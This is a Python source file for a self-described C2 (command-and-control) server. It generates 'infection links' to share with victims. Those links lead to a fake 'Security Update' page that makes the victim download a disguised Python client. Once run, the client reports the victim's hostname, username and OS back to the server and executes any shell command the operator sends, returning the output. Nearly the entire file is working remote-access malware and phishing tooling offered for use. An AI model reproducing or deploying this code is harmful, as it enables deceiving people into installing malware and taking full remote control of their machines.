#!/usr/bin/env python3
"""
QR C2 SERVER - Simple Version
Render.com Compatible
"""

from flask import Flask, request, jsonify, send_file, Response
from flask_socketio import SocketIO, emit, join_room
from flask_cors import CORS
import os
import base64
import hashlib
import time
import secrets
import threading
import json
from collections import defaultdict

app = Flask(__name__)
CORS(app)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024

socketio = SocketIO(app, 
                   cors_allowed_origins="*",
                   async_mode='threading',
                   logger=False,
                   engineio_logger=False)

# Storage
for dir in ['uploads', 'downloads', 'logs']:
    os.makedirs(dir, exist_ok=True)

# In-memory storage
clients = {}
client_sockets = {}
command_results = {}
pending_commands = defaultdict(list)
connected_controllers = set()
session_tokens = {}

# Authentication
ADMIN_PASSWORD = "C2Master123"
SESSION_DURATION = 3600

print("""
╔══════════════════════════════════════════════════════╗
║           SIMPLE C2 SERVER v1.0                     ║
║          Render.com Compatible                      ║
╚══════════════════════════════════════════════════════╝
""")

# ============= AUTHENTICATION =============

def check_auth():
    token = request.cookies.get('c2_token')
    if token and token in session_tokens:
        if session_tokens[token] > time.time():
            return True
        else:
            del session_tokens[token]
    return False

# ============= WEB ROUTES =============

@app.route('/')
def index():
    if check_auth():
        return dashboard_html()
    return login_html()

@app.route('/login', methods=['POST'])
def login():
    password = request.form.get('password', '')
    
    if password == ADMIN_PASSWORD:
        token = secrets.token_hex(32)
        session_tokens[token] = time.time() + SESSION_DURATION
        
        response = app.make_response(dashboard_html())
        response.set_cookie('c2_token', token, max_age=SESSION_DURATION, httponly=True)
        return response
    
    return '''
    <html>
    <head><title>Access Denied</title></head>
    <body style="background:#f0f0f0;display:flex;justify-content:center;align-items:center;height:100vh;">
        <div style="background:white;padding:40px;border-radius:10px;text-align:center;">
            <h1 style="color:red;">⚠️ ACCESS DENIED</h1>
            <p>Invalid password</p>
            <a href="/" style="display:inline-block;margin-top:20px;padding:10px 20px;background:#007bff;color:white;text-decoration:none;border-radius:5px;">Try Again</a>
        </div>
    </body>
    </html>
    '''

@app.route('/logout')
def logout():
    token = request.cookies.get('c2_token')
    if token in session_tokens:
        del session_tokens[token]
    
    response = app.make_response(login_html())
    response.set_cookie('c2_token', '', expires=0)
    return response

@app.route('/generate_qr')
def generate_qr():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    infection_id = secrets.token_hex(16)
    infection_url = f"{request.host_url}client/{infection_id}"
    
    # Return QR code data URL (using simple base64 encoded text for now)
    # In production, you'd generate actual QR code
    qr_data = f"data:text/plain;base64,{base64.b64encode(infection_url.encode()).decode()}"
    
    return jsonify({
        'qr_data': qr_data,
        'infection_url': infection_url,
        'infection_id': infection_id
    })

@app.route('/client/<infection_id>')
def client_page(infection_id):
    """Page that victims visit"""
    server_url = request.host_url.rstrip('/')
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Security Update</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }}
            .container {{
                background: white;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                text-align: center;
                max-width: 500px;
            }}
            .loader {{
                border: 5px solid #f3f3f3;
                border-top: 5px solid #667eea;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 2s linear infinite;
                margin: 20px auto;
            }}
            @keyframes spin {{
                0% {{ transform: rotate(0deg); }}
                100% {{ transform: rotate(360deg); }}
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔒 Security Update</h1>
            <p>Your device requires an important security update.</p>
            <div class="loader"></div>
            <p id="status">Initializing security module...</p>
        </div>
        
        <script>
            const serverUrl = "{server_url}";
            
            function connectToC2() {{
                // Try to connect via WebSocket
                const ws = new WebSocket(`ws://${{window.location.host}}/socket.io/?transport=websocket`);
                
                ws.onopen = () => {{
                    document.getElementById('status').textContent = 'Connected to security server...';
                    
                    // Send registration data
                    const data = {{
                        type: 'register',
                        data: {{
                            hostname: window.location.hostname,
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            infection_id: '{infection_id}'
                        }}
                    }};
                    
                    ws.send(JSON.stringify(data));
                }};
                
                ws.onmessage = (event) => {{
                    console.log('Message from server:', event.data);
                }};
            }}
            
            // Also try to download and execute Python client
            function downloadClient() {{
                fetch(`${{serverUrl}}/download_client`)
                    .then(response => response.text())
                    .then(code => {{
                        document.getElementById('status').textContent = 'Installing security update...';
                        
                        // Create a blob and download
                        const blob = new Blob([code], {{ type: 'text/python' }});
                        const url = window.URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'security_update.py';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                        
                        document.getElementById('status').textContent = '✓ Security update downloaded! Run the file to complete installation.';
                    }});
            }}
            
            // Start connection attempts
            setTimeout(connectToC2, 1000);
            setTimeout(downloadClient, 3000);
        </script>
    </body>
    </html>
    '''

@app.route('/download_client')
def download_client():
    """Serve the Python client"""
    server_url = request.host_url.rstrip('/')
    
    client_code = f'''#!/usr/bin/env python3
"""
C2 Client - Security Update
"""

import socketio
import platform
import getpass
import subprocess
import threading
import time
import sys

sio = socketio.Client()
server_url = "{server_url}"

@sio.on('connect')
def connect():
    print("[+] Connected to security server")
    sio.emit('register', {{
        'hostname': platform.node(),
        'username': getpass.getuser(),
        'os': platform.system() + " " + platform.release(),
        'platform': platform.platform()
    }})

@sio.on('command')
def command(data):
    try:
        cmd = data.get('command', '')
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout
        if result.stderr:
            output += "\\nERROR:\\n" + result.stderr
        
        sio.emit('result', {{
            'command_id': data['id'],
            'command': cmd,
            'output': output,
            'success': result.returncode == 0
        }})
    except Exception as e:
        sio.emit('result', {{
            'command_id': data['id'],
            'command': cmd,
            'output': f"Error: {{str(e)}}",
            'success': False
        }})

def heartbeat():
    while True:
        sio.emit('heartbeat', {{'timestamp': time.time()}})
        time.sleep(30)

if __name__ == '__main__':
    try:
        sio.connect(server_url)
        threading.Thread(target=heartbeat, daemon=True).start()
        sio.wait()
    except Exception as e:
        print(f"[-] Connection error: {{e}}")
        time.sleep(5)
'''

    response = Response(client_code, mimetype='text/plain')
    response.headers['Content-Disposition'] = 'attachment; filename=security_update.py'
    return response

# ============= API ROUTES =============

@app.route('/api/clients')
def api_clients():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    client_list = []
    for client_id, client in clients.items():
        client_list.append({
            'client_id': client_id,
            'hostname': client.get('hostname', 'Unknown'),
            'username': client.get('username', 'Unknown'),
            'os': client.get('os', 'Unknown'),
            'online': client.get('online', False),
            'last_seen': client.get('last_seen', 0)
        })
    return jsonify(client_list)

@app.route('/api/execute', methods=['POST'])
def api_execute():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.get_json()
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not client_id or not command:
        return jsonify({'error': 'Missing client_id or command'}), 400
    
    if client_id not in clients:
        return jsonify({'error': 'Client not found'}), 404
    
    cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
    cmd_obj = {
        'id': cmd_id,
        'command': command,
        'timestamp': time.time(),
        'status': 'pending'
    }
    
    if client_id in client_sockets:
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        return jsonify({'status': 'sent', 'command_id': cmd_id})
    else:
        pending_commands[client_id].append(cmd_obj)
        return jsonify({'status': 'queued', 'command_id': cmd_id})

@app.route('/api/stats')
def api_stats():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    online = sum(1 for c in clients.values() if c.get('online', False))
    return jsonify({
        'total_clients': len(clients),
        'online_clients': online,
        'total_commands': len(command_results),
        'server_uptime': time.time() - app_start_time
    })

# ============= SOCKET.IO EVENTS =============

app_start_time = time.time()

@socketio.on('connect')
def handle_connect():
    print(f"[+] New connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in connected_controllers:
        connected_controllers.remove(request.sid)
        print(f"[-] Controller disconnected: {request.sid}")
        return
    
    for client_id, socket_id in list(client_sockets.items()):
        if socket_id == request.sid:
            if client_id in clients:
                clients[client_id]['online'] = False
                clients[client_id]['last_seen'] = time.time()
            del client_sockets[client_id]
            print(f"[-] Client disconnected: {client_id}")
            socketio.emit('client_offline', {'client_id': client_id})
            break

@socketio.on('controller_connect')
def handle_controller_connect():
    token = request.args.get('token')
    if not token or token not in session_tokens or session_tokens[token] < time.time():
        emit('auth_error', {'error': 'Invalid or expired token'})
        return
    
    connected_controllers.add(request.sid)
    print(f"[+] Web controller connected: {request.sid}")
    
    for client_id, client in clients.items():
        if client.get('online', False):
            socketio.emit('client_online', {
                'client_id': client_id,
                'hostname': client.get('hostname', 'Unknown'),
                'username': client.get('username', 'Unknown'),
                'os': client.get('os', 'Unknown'),
                'online': True
            }, room=request.sid)
    
    emit('controller_ready', {'message': 'Connected to C2 server'})

@socketio.on('execute_command')
def handle_execute_command(data):
    client_id = data.get('client_id')
    command = data.get('command')
    
    if client_id in client_sockets:
        cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
        cmd_obj = {
            'id': cmd_id,
            'command': command,
            'timestamp': time.time(),
            'status': 'pending'
        }
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        emit('command_sent', {'command_id': cmd_id, 'client_id': client_id})
    else:
        emit('command_error', {'error': 'Client offline', 'client_id': client_id})

@socketio.on('register')
def handle_register(data):
    client_id = data.get('id')
    
    if not client_id:
        unique = f"{data.get('hostname', '')}{data.get('username', '')}{data.get('os', '')}{time.time()}"
        client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
    
    clients[client_id] = {
        'id': client_id,
        'hostname': data.get('hostname', 'Unknown'),
        'username': data.get('username', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'ip': request.remote_addr,
        'online': True,
        'first_seen': time.time(),
        'last_seen': time.time()
    }
    
    client_sockets[client_id] = request.sid
    join_room(client_id)
    
    print(f"[+] Client registered: {client_id}")
    
    emit('welcome', {
        'client_id': client_id,
        'message': 'Connected to Security Server',
        'timestamp': time.time()
    })
    
    socketio.emit('client_online', {
        'client_id': client_id,
        'hostname': data.get('hostname'),
        'username': data.get('username'),
        'os': data.get('os'),
        'platform': data.get('platform'),
        'ip': request.remote_addr,
        'online': True
    })
    
    if client_id in pending_commands and pending_commands[client_id]:
        for cmd in pending_commands[client_id]:
            emit('command', cmd)
        pending_commands[client_id].clear()

@socketio.on('heartbeat')
def handle_heartbeat(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        clients[client_id]['last_seen'] = time.time()
        clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('result')
def handle_result(data):
    cmd_id = data.get('command_id')
    client_id = data.get('client_id')
    
    print(f"[*] Result from {client_id}")
    
    result_data = {
        'command_id': cmd_id,
        'client_id': client_id,
        'command': data.get('command', ''),
        'output': data.get('output', ''),
        'success': data.get('success', True),
        'timestamp': time.time()
    }
    
    command_results[cmd_id] = result_data
    socketio.emit('command_result', result_data)

# ============= HTML TEMPLATES =============

def login_html():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Control - Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .login-box {
                background: white;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                width: 90%;
                max-width: 400px;
                text-align: center;
            }
            h1 {
                color: #333;
                margin-bottom: 20px;
            }
            input[type="password"] {
                width: 100%;
                padding: 15px;
                margin-bottom: 20px;
                border: 2px solid #ddd;
                border-radius: 5px;
                font-size: 16px;
            }
            button {
                width: 100%;
                padding: 15px;
                background: #667eea;
                color: white;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                cursor: pointer;
            }
            button:hover {
                background: #5a67d8;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>🔐 C2 Control Panel</h1>
            <p style="color:#666;margin-bottom:20px;">Enter password to continue</p>
            <form method="POST" action="/login">
                <input type="password" name="password" placeholder="Password" required autofocus>
                <button type="submit">Login</button>
            </form>
            <p style="color:#999;font-size:12px;margin-top:20px;">⚠️ Authorized access only</p>
        </div>
    </body>
    </html>
    '''

def dashboard_html():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Control Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: Arial, sans-serif;
                background: #f5f5f5;
            }
            .header {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 20px;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            .container {
                padding: 20px;
                max-width: 1200px;
                margin: 0 auto;
            }
            .stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-card {
                background: white;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                text-align: center;
            }
            .stat-value {
                font-size: 36px;
                font-weight: bold;
                color: #667eea;
            }
            .client-list {
                background: white;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                margin-bottom: 30px;
            }
            .client-item {
                background: #f8f9fa;
                padding: 15px;
                margin-bottom: 10px;
                border-radius: 5px;
                border-left: 4px solid #667eea;
            }
            .online { border-left-color: #28a745; }
            .offline { border-left-color: #dc3545; }
            .command-box {
                background: white;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .command-input {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 2px solid #ddd;
                border-radius: 5px;
            }
            .btn {
                padding: 10px 20px;
                background: #667eea;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
            .btn:hover { background: #5a67d8; }
            .output {
                background: #1a1a1a;
                color: #00ff00;
                padding: 15px;
                border-radius: 5px;
                font-family: monospace;
                margin-top: 20px;
                height: 300px;
                overflow-y: auto;
            }
            .tab {
                padding: 10px 20px;
                cursor: pointer;
                border-bottom: 2px solid transparent;
            }
            .tab.active {
                border-bottom-color: white;
                font-weight: bold;
            }
            .tab-content {
                display: none;
            }
            .tab-content.active {
                display: block;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🛡️ C2 Control Panel</h1>
            <div>
                <a href="/logout" style="color:white;text-decoration:none;padding:10px 20px;background:rgba(0,0,0,0.2);border-radius:5px;">Logout</a>
            </div>
        </div>
        
        <div class="container">
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-value" id="total-clients">0</div>
                    <div>Total Clients</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="online-clients">0</div>
                    <div>Online Now</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="total-commands">0</div>
                    <div>Commands Executed</div>
                </div>
            </div>
            
            <div style="display:flex;gap:10px;margin-bottom:20px;">
                <button class="btn" onclick="showTab('clients')">📱 Clients</button>
                <button class="btn" onclick="showTab('infect')">🔗 Infect</button>
                <button class="btn" onclick="showTab('commands')">💻 Commands</button>
            </div>
            
            <div id="clients-tab" class="tab-content active">
                <div class="client-list">
                    <h3>Connected Devices</h3>
                    <div id="client-list">
                        <p style="text-align:center;color:#999;padding:40px;">No clients connected</p>
                    </div>
                </div>
            </div>
            
            <div id="infect-tab" class="tab-content">
                <div class="client-list">
                    <h3>Generate Infection Link</h3>
                    <p>Create a link to infect new devices:</p>
                    <button class="btn" onclick="generateInfectionLink()" style="margin:20px 0;">Generate Link</button>
                    <div id="infection-result" style="display:none;">
                        <p><strong>Infection URL:</strong></p>
                        <input type="text" id="infection-url" readonly style="width:100%;padding:10px;margin:10px 0;">
                        <p>Share this URL with victims. When they visit it, they will be infected.</p>
                    </div>
                </div>
            </div>
            
            <div id="commands-tab" class="tab-content">
                <div class="command-box">
                    <h3>Remote Command Execution</h3>
                    <select id="client-select" style="width:100%;padding:10px;margin:10px 0;">
                        <option value="">Select a client...</option>
                    </select>
                    <input type="text" id="command-input" class="command-input" placeholder="Enter command...">
                    <button class="btn" onclick="executeCommand()">Execute</button>
                    
                    <div style="margin:20px 0;">
                        <p>Quick Commands:</p>
                        <div style="display:flex;gap:10px;flex-wrap:wrap;">
                            <button class="btn" onclick="sendQuickCommand('whoami')">whoami</button>
                            <button class="btn" onclick="sendQuickCommand('ipconfig')">ipconfig</button>
                            <button class="btn" onclick="sendQuickCommand('dir')">dir</button>
                            <button class="btn" onclick="sendQuickCommand('tasklist')">tasklist</button>
                        </div>
                    </div>
                    
                    <h4>Output:</h4>
                    <div class="output" id="command-output"></div>
                </div>
            </div>
        </div>
        
        <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
        <script>
            let socket = null;
            let selectedClient = null;
            
            function initWebSocket() {
                const token = getCookie('c2_token');
                const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                const wsUrl = `${protocol}//${window.location.host}/socket.io/?token=${token}`;
                
                socket = io(wsUrl);
                
                socket.on('connect', () => {
                    console.log('Connected');
                    socket.emit('controller_connect');
                    updateStats();
                });
                
                socket.on('auth_error', () => {
                    alert('Session expired. Please login again.');
                    window.location.href = '/';
                });
                
                socket.on('client_online', (data) => {
                    addClient(data);
                });
                
                socket.on('client_offline', (data) => {
                    updateClientStatus(data.client_id, false);
                });
                
                socket.on('command_result', (data) => {
                    addOutput(data);
                });
            }
            
            function addClient(client) {
                const list = document.getElementById('client-list');
                const select = document.getElementById('client-select');
                
                // Add to list
                const item = document.createElement('div');
                item.className = `client-item ${client.online ? 'online' : 'offline'}`;
                item.id = `client-${client.client_id}`;
                item.innerHTML = `
                    <div style="display:flex;justify-content:space-between;">
                        <strong>${client.hostname}</strong>
                        <span>${client.online ? '🟢 Online' : '🔴 Offline'}</span>
                    </div>
                    <div style="font-size:12px;color:#666;">
                        👤 ${client.username} | 💻 ${client.os}
                    </div>
                `;
                item.onclick = () => selectClient(client.client_id);
                list.appendChild(item);
                
                // Add to select
                const option = document.createElement('option');
                option.value = client.client_id;
                option.textContent = `${client.hostname} (${client.os})`;
                select.appendChild(option);
                
                updateStats();
            }
            
            function selectClient(clientId) {
                selectedClient = clientId;
                document.getElementById('client-select').value = clientId;
            }
            
            function updateClientStatus(clientId, isOnline) {
                const item = document.getElementById(`client-${clientId}`);
                if (item) {
                    item.className = `client-item ${isOnline ? 'online' : 'offline'}`;
                    item.querySelector('span').textContent = isOnline ? '🟢 Online' : '🔴 Offline';
                }
                updateStats();
            }
            
            async function generateInfectionLink() {
                const response = await fetch('/generate_qr');
                const data = await response.json();
                
                document.getElementById('infection-url').value = data.infection_url;
                document.getElementById('infection-result').style.display = 'block';
                
                // Copy to clipboard
                navigator.clipboard.writeText(data.infection_url);
                alert('Infection URL copied to clipboard!');
            }
            
            function executeCommand() {
                const clientId = document.getElementById('client-select').value;
                const command = document.getElementById('command-input').value;
                
                if (!clientId || !command) {
                    alert('Please select a client and enter a command');
                    return;
                }
                
                socket.emit('execute_command', {
                    client_id: clientId,
                    command: command
                });
                
                addOutput({
                    client_id: clientId,
                    command: command,
                    output: 'Command sent...',
                    timestamp: new Date().toISOString()
                });
                
                document.getElementById('command-input').value = '';
            }
            
            function sendQuickCommand(command) {
                const clientId = document.getElementById('client-select').value;
                if (!clientId) {
                    alert('Please select a client first');
                    return;
                }
                
                socket.emit('execute_command', {
                    client_id: clientId,
                    command: command
                });
                
                addOutput({
                    client_id: clientId,
                    command: command,
                    output: 'Quick command sent...',
                    timestamp: new Date().toISOString()
                });
            }
            
            function addOutput(data) {
                const output = document.getElementById('command-output');
                const time = new Date(data.timestamp).toLocaleTimeString();
                
                const entry = document.createElement('div');
                entry.style.marginBottom = '10px';
                entry.innerHTML = `
                    <div style="color:#8888ff;">[${time}] ${data.client_id}</div>
                    <div style="color:#00aaff;">$ ${data.command}</div>
                    <div>${data.output}</div>
                `;
                
                output.appendChild(entry);
                output.scrollTop = output.scrollHeight;
            }
            
            async function updateStats() {
                const response = await fetch('/api/stats');
                const data = await response.json();
                
                document.getElementById('total-clients').textContent = data.total_clients || 0;
                document.getElementById('online-clients').textContent = data.online_clients || 0;
                document.getElementById('total-commands').textContent = data.total_commands || 0;
            }
            
            function showTab(tabName) {
                // Hide all tabs
                document.querySelectorAll('.tab-content').forEach(tab => {
                    tab.classList.remove('active');
                });
                
                // Show selected tab
                document.getElementById(`${tabName}-tab`).classList.add('active');
            }
            
            function getCookie(name) {
                const value = `; ${document.cookie}`;
                const parts = value.split(`; ${name}=`);
                if (parts.length === 2) return parts.pop().split(';').shift();
            }
            
            // Initialize
            window.onload = function() {
                initWebSocket();
                setInterval(updateStats, 5000);
            };
        </script>
    </body>
    </html>
    '''

# ============= CLEANUP =============

def cleanup_thread():
    while True:
        try:
            cutoff = time.time() - 120
            for client_id, client in list(clients.items()):
                if client.get('last_seen', 0) < cutoff and client.get('online', False):
                    clients[client_id]['online'] = False
                    socketio.emit('client_offline', {'client_id': client_id})
            
            time.sleep(60)
            
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
            time.sleep(60)

threading.Thread(target=cleanup_thread, daemon=True).start()

# ============= MAIN =============

def main():
    port = int(os.environ.get('PORT', 10000))
    
    print(f"[*] Starting Simple C2 Server on port {port}")
    print(f"[*] Web Interface: http://0.0.0.0:{port}")
    print(f"[*] Login Password: {ADMIN_PASSWORD}")
    print(f"[*] Ready for connections!")
    
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)

if __name__ == '__main__':
    main()
